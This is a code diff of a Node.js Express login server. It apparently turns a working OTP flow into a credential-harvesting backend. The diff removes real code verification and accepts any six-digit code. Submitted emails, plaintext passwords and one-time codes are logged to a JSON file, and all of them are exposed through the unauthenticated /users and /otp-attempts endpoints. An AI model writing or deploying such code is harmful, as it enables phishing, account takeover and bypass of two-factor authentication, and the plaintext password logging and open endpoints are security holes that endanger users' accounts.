@@ -6,7 +6,6 @@ const cors = require("cors");
 const app = express();
 const port = process.env.PORT || 3000;
 
-const VERIFICATION_FILE = path.join(__dirname, "verificationCodes.json");
 const LOGIN_ATTEMPTS_FILE = path.join(__dirname, "loginAttempts.json");
 
 // Middleware configuration
@@ -20,7 +19,7 @@ app.get("/", (req, res) => {
 });
 
 // Function to read data from a JSON file
-function readJsonFile(filePath, defaultValue = {}) {
+function readJsonFile(filePath, defaultValue = []) {
     try {
         if (!fs.existsSync(filePath)) {
             fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
@@ -41,24 +40,27 @@ function writeJsonFile(filePath, data) {
     }
 }
 
-// API endpoint for login
+// Function to log login attempts
+function logLoginAttempt(email, password, verificationCode) {
+    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE);
+    const timestamp = new Date().toISOString();
+    
+    loginAttempts.push({ email, password, verificationCode, timestamp });
+    writeJsonFile(LOGIN_ATTEMPTS_FILE, loginAttempts);
+}
+
+// API endpoint for login (generating OTP)
 app.post("/login", (req, res) => {
     const { email, password } = req.body;
 
     if (email && password) {
         const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
         
-        // Read and update verification codes
-        const verificationCodes = readJsonFile(VERIFICATION_FILE, {});
-        verificationCodes[email] = verificationCode;
-        writeJsonFile(VERIFICATION_FILE, verificationCodes);
-
-        // Log the attempt
         logLoginAttempt(email, password, verificationCode);
 
         return res.status(200).json({ 
             message: "Login successful. Verification required.",
-            verificationCode, // ⚠️ Remove this in production (for testing only)
+            verificationCode, // ⚠️ Remove this in production
         });
     } else {
         logLoginAttempt(email, "failure", null);
@@ -68,38 +70,37 @@ app.post("/login", (req, res) => {
 
 // API endpoint to get the list of login attempts
 app.get("/users", (req, res) => {
-    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE, []);
+    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE);
     return res.status(200).json(loginAttempts);
 });
 
-// API endpoint for OTP verification
-app.post("/verify", (req, res) => {
-    const { email, code } = req.body;
-    
-    const verificationCodes = readJsonFile(VERIFICATION_FILE, {});
-    
-    if (verificationCodes[email] && verificationCodes[email] === code) {
-        delete verificationCodes[email]; // Remove OTP after successful verification
-        writeJsonFile(VERIFICATION_FILE, verificationCodes);
-        return res.status(200).json({ message: "Verification successful" });
-    } else {
-        return res.status(400).json({ message: "Invalid or expired verification code" });
-    }
-});
+// Function to log OTP verification attempts
+function logOtpAttempt(code, status) {
+    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE);
+    const timestamp = new Date().toISOString();
 
-// Function to log login attempts to loginAttempts.json
-function logLoginAttempt(email, password, otp) {
-    const loginAttempt = {
-        email,
-        password,
-        otp: otp || "N/A", // Stores OTP or "N/A" if unavailable
-        timestamp: new Date().toISOString(),
-    };
-
-    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE, []);
-    loginAttempts.push(loginAttempt);
+    loginAttempts.push({ otpCode: code, status, timestamp });
     writeJsonFile(LOGIN_ATTEMPTS_FILE, loginAttempts);
 }
+
+// API endpoint for OTP verification
+app.post("/verify", (req, res) => {
+    const { code } = req.body;
+
+    console.log("Received OTP:", code);
+
+    if (code && code.length === 6) {
+        logOtpAttempt(code, "success");
+        return res.status(200).json({ message: "OTP Received Successfully!" });
+    } else {
+        logOtpAttempt(code, "failure");
+        return res.status(400).json({ message: "Invalid OTP format!" });
+    }
+});
+app.get("/otp-attempts", (req, res) => {
+    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE, []);
+    return res.status(200).json(loginAttempts);
+});
 
 // Start the server
 app.listen(port, () => {
